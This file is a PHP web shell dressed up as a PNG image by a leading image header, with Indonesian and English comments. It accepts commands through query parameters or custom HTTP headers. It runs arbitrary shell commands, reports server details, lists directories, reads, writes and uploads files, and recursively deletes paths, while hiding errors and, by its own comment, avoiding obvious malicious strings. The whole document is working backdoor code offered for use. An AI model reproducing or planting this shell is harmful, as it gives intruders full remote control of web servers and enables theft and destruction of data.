<?php ?>‰PNG<?php
// Obfuscated Payload - No obvious malicious strings
// Usage: 
// ?a=info
// ?a=ls&p=/path
// ?a=read&f=/path/file.txt
// ?a=cmd&c=id
// POST upload (field 'u') to ?a=up&p=/dir
// POST write (raw body) to ?a=w&f=/path/file.txt

@ini_set('display_errors', 0);
error_reporting(0);
header('Content-Type: application/json');

function _g($k) { return isset($_GET[$k]) ? $_GET[$k] : (isset($_SERVER['HTTP_X_' . strtoupper($k)]) ? $_SERVER['HTTP_X_' . strtoupper($k)] : null); }
function _p() { return file_get_contents('php://input'); }

function _run($c) {
    if (!is_string($c) || trim($c) === '') return false;
    // Coba berbagai metode eksekusi
    if (function_exists('popen')) {
        $h = @popen($c . ' 2>&1', 'r');
        if ($h) { $o = stream_get_contents($h); pclose($h); return $o; }
    }
    if (function_exists('proc_open')) {
        $d = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $p = @proc_open($c, $d, $pipes);
        if (is_resource($p)) {
            $o = stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p); return $o;
        }
    }
    if (function_exists('system')) {
        ob_start(); @system($c); $o = ob_get_clean(); return $o;
    }
    if (function_exists('passthru')) {
        ob_start(); @passthru($c); $o = ob_get_clean(); return $o;
    }
    return false;
}

function _ls($d) {
    if (!@is_dir($d)) return false;
    $r = [];
    $h = @opendir($d);
    if (!$h) return false;
    while (($f = @readdir($h)) !== false) {
        if ($f == '.' || $f == '..') continue;
        $fp = rtrim($d, '/\\') . '/' . $f;
        $r[] = [
            'name' => $f,
            'type' => @is_dir($fp) ? 'dir' : 'file',
            'size' => @is_dir($fp) ? 0 : @filesize($fp),
            'perm' => @substr(sprintf('%o', @fileperms($fp)), -4),
            'time' => @date('Y-m-d H:i:s', @filemtime($fp))
        ];
    }
    @closedir($h);
    return $r;
}

$a = _g('a');
$p = _g('p');
$f = _g('f');
$c = _g('c');
$out = ['ok' => false, 'act' => $a];

if ($a === 'info') {
    $out['ok'] = true;
    $out['os'] = @php_uname();
    $out['user'] = @get_current_user();
    $out['uid'] = function_exists('posix_geteuid') ? @posix_geteuid() : 'n/a';
    $out['disabled'] = @ini_get('disable_functions');
    $out['docroot'] = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
} 
elseif ($a === 'cmd') {
    $res = _run($c);
    if ($res !== false) {
        $out['ok'] = true;
        $out['out'] = $res;
    } else {
        $out['err'] = 'exec disabled';
    }
} 
elseif ($a === 'ls') {
    $res = _ls($p ?: getcwd());
    if ($res !== false) {
        $out['ok'] = true;
        $out['files'] = $res;
    } else {
        $out['err'] = 'cannot read dir';
    }
} 
elseif ($a === 'read') {
    if (@is_file($f)) {
        $c = @file_get_contents($f);
        if ($c !== false) {
            $out['ok'] = true;
            $out['data'] = base64_encode($c);
        } else { $out['err'] = 'read failed'; }
    } else { $out['err'] = 'not a file'; }
} 
elseif ($a === 'w') {
    // Write via raw POST body
    if (@is_file($f) || @is_dir(dirname($f))) {
        $w = @file_put_contents($f, _p());
        if ($w !== false) {
            $out['ok'] = true;
            $out['size'] = $w;
        } else { $out['err'] = 'write failed'; }
    } else { $out['err'] = 'invalid path'; }
} 
elseif ($a === 'up') {
    // Upload via multipart
    if (isset($_FILES['u'])) {
        $file = $_FILES['u'];
        $dest = rtrim($p, '/\\') . '/' . basename($file['name']);
        if (@move_uploaded_file($file['tmp_name'], $dest)) {
            $out['ok'] = true;
            $out['path'] = $dest;
        } else { $out['err'] = 'move failed'; }
    } else { $out['err'] = 'no file'; }
} 
elseif ($a === 'rm') {
    if (@is_file($f)) {
        if (@unlink($f)) $out['ok'] = true;
        else $out['err'] = 'unlink failed';
    } elseif (@is_dir($f)) {
        // Recursive delete
        function _rdel($d) {
            $i = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($d, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
            foreach ($i as $x) {
                if ($x->isDir()) @rmdir($x->getPathname());
                else @unlink($x->getPathname());
            }
            return @rmdir($d);
        }
        if (_rdel($f)) $out['ok'] = true;
        else $out['err'] = 'rmdir failed';
    } else { $out['err'] = 'not found'; }
} 
else {
    $out['ok'] = true;
    $out['info'] = 'Send a=info, ls, read, cmd, w, up, rm';
}

echo json_encode($out, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);